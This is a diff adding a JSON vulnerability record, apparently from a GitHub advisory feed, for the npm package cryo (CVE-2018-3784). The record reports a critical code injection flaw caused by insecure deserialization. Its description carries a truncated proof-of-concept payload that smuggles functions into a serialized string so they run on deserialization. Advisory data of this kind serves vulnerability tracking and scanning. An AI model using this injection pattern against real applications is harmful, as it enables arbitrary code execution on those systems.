@@ -1,0 +1,32 @@
+{
+  "packageName": "cryo",
+  "lastUpdated": "2026-05-04T13:06:56.926Z",
+  "vulnerabilities": [
+    {
+      "id": "GHSA-38f5-ghc2-fcmv",
+      "packageName": "cryo",
+      "title": "Code Injection in cryo",
+      "description": "All versions of `cryo` are vulnerable to code injection due to an Insecure implementation of deserialization.\n\n\n## Proof of concept\n\n```js\nvar Cryo = require('cryo');\nvar frozen = '{\"root\":\"_CRYO_REF_3\",\"references\":[{\"contents\":{},\"value\":\"_CRYO_FUNCTION_function () {console.log(\\\\\"defconrussia\\\\\"); return 1111;}\"},{\"contents\":{},\"value\":\"_CRYO_FUNCTION_function () {console.log(\\\\\"defconrussia\\\\\");return 2222;}\"},{\"contents\":{\"toString\":\"_CRYO_REF_0\",\"valueOf\":\"_CRYO_REF_1\"},\"value\":\"_CRYO_OBJE",
+      "severity": "critical",
+      "url": "https://github.com/advisories/GHSA-38f5-ghc2-fcmv",
+      "publishedAt": "2018-08-21T17:02:43Z",
+      "modifiedAt": "2023-09-12T18:38:55Z",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-38f5-ghc2-fcmv"
+        },
+        {
+          "type": "CVE",
+          "value": "CVE-2018-3784"
+        }
+      ],
+      "affectedVersions": [
+        {
+          "range": "<= 0.0.6"
+        }
+      ],
+      "source": "github"
+    }
+  ]
+}
